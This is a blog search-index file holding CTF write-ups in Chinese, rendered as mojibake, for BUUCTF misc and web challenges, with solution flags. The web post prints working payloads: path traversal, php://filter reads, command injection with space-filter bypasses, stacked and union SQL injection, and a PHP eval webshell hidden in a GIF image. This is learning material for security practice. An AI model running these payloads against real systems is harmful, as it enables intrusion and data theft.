<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buu_misc</title>
    <url>/2023/01/24/buu-misc/</url>
    <content><![CDATA[<p>  buuç¬¬ä¸€é¡µã€‚</p>
 <span id="more"></span>

<h1 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h1><p>010æ‰“å¼€ç¬¬äºŒè¡Œ6ï¼Œ7å³é«˜åº¦</p>
<p>flag{He1lO_d4_ba1}</p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>é¢˜ç›® ï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
<p>æ ¹æ®æç¤ºç›´æ¥è¿‡æ»¤å‡ºPOSTåŒ…</p>
<p>http.request.method&#x3D;&#x3D;POST</p>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
<h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>æœªåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p> ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p>ä¼ªåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p>ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p>çœŸåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p>ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">(6æ¡æ¶ˆæ¯) CTFâ€”â€”zipä¼ªåŠ å¯†_xiaozhaidadaçš„åšå®¢-CSDNåšå®¢</a></p>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
<h1 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h1><p>æŸé»‘å®¢æ½œå…¥åˆ°æŸå…¬å¸å†…ç½‘é€šè¿‡å—…æ¢æŠ“å–äº†ä¸€æ®µæ–‡ä»¶ä¼ è¾“çš„æ•°æ®ï¼Œè¯¥æ•°æ®ä¹Ÿè¢«è¯¥å…¬å¸æˆªè·ï¼Œä½ èƒ½å¸®è¯¥å…¬å¸åˆ†æä»–æŠ“å–çš„åˆ°åº•æ˜¯ä»€ä¹ˆæ–‡ä»¶çš„æ•°æ®å—ï¼Ÿ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
<p><a href="https://files.buuoj.cn/files/ff965ff87437e3fda765ba928da94821/efa02e35-ee20-476f-94a2-cadbcef7d076.zip"> efa02e35-ee20-476f-94a2-cadbcef7d076.zip</a></p>
<p>è§£æ³•ä¸€</p>
<p>æ ¹æ®æç¤ºï¼Œæ–‡ä»¶ä¼ è¾“ç›´æ¥æ‰¾POSTçš„åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒ</p>
<p>æŸ¥æ‰¾å­—ç¬¦<strong>flag.</strong></p>
<p>è¿½è¸ªæµtcpæµæ‰“å¼€</p>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><a href="https://www.online-qr-scanner.com/zh-cn/">åœ¨çº¿äºŒç»´ç æ‰«æå™¨ (online-qr-scanner.com)</a></p>
<p>è§£æ³•äºŒ</p>
<p>å¾®ä¿¡æ‰«ä¸€ä¸‹</p>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
<h2 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h2><p>flag{st3g0_saurus_wr3cks}</p>
<h2 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h2><p>01101011011011110110010101101011011010100011001101110011</p>
<p> åœ¨æ–‡ä»¶æœ€åæ‰¾åˆ°ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—ï¼Œä»¥8 ä½ä¸ºä¸€ç»„ï¼Œè½¬æ¢ä¸º10è¿›åˆ¶ï¼Œå†å¯¹ç…§ASCIIç è¡¨å¾—å‡ºå­—ç¬¦ã€‚æœ€åä»¥flagæ ¼å¼æäº¤ã€‚flag{koekj3s}</p>
<h2 id="webshellåé—¨"><a href="#webshellåé—¨" class="headerlink" title="webshellåé—¨"></a>webshellåé—¨</h2><p>dç›¾æŸ¥ä¸€ä¸‹å°±å‡ºæ¥äº†ä½†æ˜¯æ–‡ä»¶ä¿®æ”¹è¿‡äº†ï¼Œä½†flagæ²¡æ”¹ï¼Œ</p>
<p>ä½†æ— æ‰€è°“äº†</p>
<p>åé—¨æŸ¥æ€åŒä¸Šé¢˜</p>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>æ˜¯PNG IDATçš„å¯é€‰å‹ç¼©æ ¼å¼</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu_web</title>
    <url>/2023/02/01/buu-web/</url>
    <content><![CDATA[<p>   buuç¬¬ä¸€é¡µã€‚</p>
 <span id="more"></span>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="comment">//åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//ä»<span class="number">0</span>æˆªå–åˆ°ï¼Ÿ</span><br><span class="line">            );<span class="comment">//.&#x27;?&#x27;åœ¨ç»“å°¾è¡¥?</span></span><br><span class="line">            <span class="comment">//mb_strpos()mb_strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line">              <span class="comment">//mb_substr() å‡½æ•°æ ¹æ® start å’Œ length å‚æ•°è¿”å› str ä¸­æŒ‡å®šçš„éƒ¨åˆ†</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//æˆªå–åæ˜¯å¦å­˜åœ¨åœ¨ç™½åå•</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//checkFileæ ¡éªŒ</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>â€œ.&#x2F;â€œï¼šä»£è¡¨ç›®å‰æ‰€åœ¨çš„ç›®å½•ã€‚</strong></p>
<p><strong>â€œ . .&#x2F;â€œä»£è¡¨ä¸Šä¸€å±‚ç›®å½•ã€‚</strong></p>
<p><strong>â€œ&#x2F;â€œï¼šä»£è¡¨æ ¹ç›®å½•ã€‚</strong></p>
<p>æ³¨ï¼š ç¡®ä¿urlè§£ç åèƒ½é€šè¿‡ç™½åå•ã€‚æµè§ˆå™¨ä¼šè§£ç ä¸€æ¬¡ï¼Œè€Œ ? ç»è¿‡ä¸€æ¬¡urlencodeç¼–ç ä¸ºï¼š%3fï¼›ä¸¤æ¬¡ä¸ºï¼š%253f</p>
<p>payload:<code>/source.php/?file=hint.php%253f../../../../../ffffllllaaaagggg</code></p>
<p><code> </code>flag{cda6b5c3-dab2-42fb-a21e-6e7280953804}</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Includeâ€“ä¼ªåè®®"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Includeâ€“ä¼ªåè®®" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Includeâ€“ä¼ªåè®®"></a>[ACTF2020 æ–°ç”Ÿèµ›]Includeâ€“ä¼ªåè®®</h2><p>ä¼ªåè®®</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>flag{bc539291-7afe-46da-9629-52bb02de6ffb}</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>127.0.0.1;ls &#x2F;;</p>
<p>127.0.0.1;cat &#x2F;flag;</p>
<p>flag{b48b1925-822a-46b7-8cdc-db7b94b1604e}</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>æ‰“å¼€å&#x2F;?ip&#x3D;</p>
<p>getä¼ å‚ip&#x3D;1æ—¶</p>
<p>è¿”å›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 2 (0.0.0.2): 56 data bytes</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯ä¸€ä¸ªè®¡ç®—æœºæŒ‡ä»¤ï¼Œipçš„å€¼ä¸ºipåœ°å€</p>
<p>?ip&#x3D;127.0.0.1;ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>cat flag.php</p>
<p>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œflagï¼Œ* ï¼Ÿè¢«è¿‡æ»¤</p>
<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php ï¼Œå‘ç°æºç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡æ–¹æ³•</p>
<ol>
<li>$IFS</li>
<li>${IFS}</li>
<li>$IFS$1 &#x2F;&#x2F;$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</li>
<li>&lt; </li>
<li>&lt;&gt; </li>
<li>{cat,flag.php}  &#x2F;&#x2F;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</li>
<li>%20 </li>
<li>%09</li>
</ol>
<p>åªèƒ½ç”¨$IFS$1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">cat *     #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºä»£ç </p>
<p>flag{4fe89af8-21fb-405b-81f1-bb4510e5d776}</p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>æµ‹è¯• 1â€™ or 1&#x3D;1 # ,åˆæ­¥åˆ¤å®šå­˜åœ¨SQLæ³¨å…¥ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>

<p>å†æµ‹è¯•å­—æ®µæ•°ï¼Œåˆ°3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€å°è¯•unionæ³¨å…¥,å›æ˜¾äº†è¿‡æ»¤çš„å…³é”®å­—ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>

<p>å †å æ³¨å…¥â€<br>åŸç†ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥</p>
<p>å…ˆé€šè¿‡show databasesçˆ†å‡ºæ•°æ®åº“ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªè¡¨ï¼Œæˆ‘ä»¬å…ˆå°è¯•çˆ†wordsè¡¨çš„å†…å®¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠ¥è¡¨ 1919810931114514 çš„å†…å®¹ã€‚</p>
<p><strong>è¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure>

<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>
<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>
<p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p>
<p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>[ BUUCTF[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ çš„ä¸‰ç§è§£æ³•_å¤©é—®_Herbert555çš„åšå®¢-CSDNåšå®¢_[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨](<a href="https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request_id%22:%22167525557716800186572538%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167525557716800186572538&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142%5Ev72%5Einsert_down1,201%5Ev4%5Eadd_ask&utm_term=%5B%E5%BC%BA%E7%BD%91%E6%9D%AF">https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request%5Fid%22%3A%22167525557716800186572538%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167525557716800186572538&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142^v72^insert_down1,201^v4^add_ask&amp;utm_term=[å¼ºç½‘æ¯</a> 2019]éšä¾¿æ³¨&amp;spm&#x3D;1018.2226.3001.4187)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e9f535-61ab-4cb5-8b24-03fb1b16d853&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 4#   æŠ¥é”™ï¼Œè¯´æ˜æ˜¯ä¸‰åˆ—</span><br><span class="line">1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class="line">1&#x27; union select group_concat(id),group_concat(username),group_concat(password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>



<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>dirsearchå»æ‰«ï¼Œæ‰«å‡ºæ¥å¤ªå¤šäº†</p>
<p>backupfileå¯çŸ¥æ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œè™½ç„¶æˆ‘æ˜¯çœ‹wpå¯çŸ¥ï¼Œ</p>
<p>&#x2F;index.php.bat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥keyï¼Œé¦–å…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ã€‚ç„¶åå¯¹keyå–æ•´ã€‚æœ€ååˆ¤æ–­keyå’Œstræ˜¯å¦ç›¸ç­‰ã€‚è¿™é‡Œå­˜åœ¨å¼±æ¯”è¾ƒæ¼æ´ã€‚<br>åŸç†ï¼šå¦‚æœkeyä¸ºæ•°å­—æ—¶ï¼Œåœ¨åš&#x3D;&#x3D;æ¯”è¾ƒæ—¶ï¼Œstr<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>è‡ªåŠ¨å˜ä¸ºæ•°å­—ï¼Œå³str&#x3D;123ã€‚</p>
<p>flag{a3cf62f3-1704-46dc-b72b-a043c514dbdd}</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a><strong>åŒå†™ç»•è¿‡</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/01/buu-web/QQ%E6%88%AA%E5%9B%BE20230511142254.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,3#</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(selselectect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_name = &#x27;b4bsql&#x27;),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 #</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><ol>
<li>ä¸€å¥è¯æœ¨é©¬<code>&lt;?</code>ç»•è¿‡</li>
<li>æ–‡ä»¶åç¼€ç»•è¿‡</li>
<li>æ–‡ä»¶ç±»å‹<code>Content-Type</code>ç»•è¿‡</li>
</ol>
<p>æ–‡ä»¶å¤´GIF86a    &#x2F;&#x2F;ç»•è¿‡å‰ç«¯éªŒè¯</p>
<p>.phtmlåç¼€å¯ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå›¾ç‰‡æœ¨é©¬çš„ç³»ç»ŸæŒ‡ä»¤</p>
<p>copy å›¾ç‰‡&#x2F;b+ä¸€å¥è¯æœ¨é©¬&#x2F;a å›¾ç‰‡æœ¨é©¬</p>
<p>è¿™å¥æŒ‡ä»¤åªèƒ½å¤Ÿåœ¨cmdç»ˆç«¯ä¸­è¿›è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy pho.jpg /b + hack.php /a hack.jpg</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
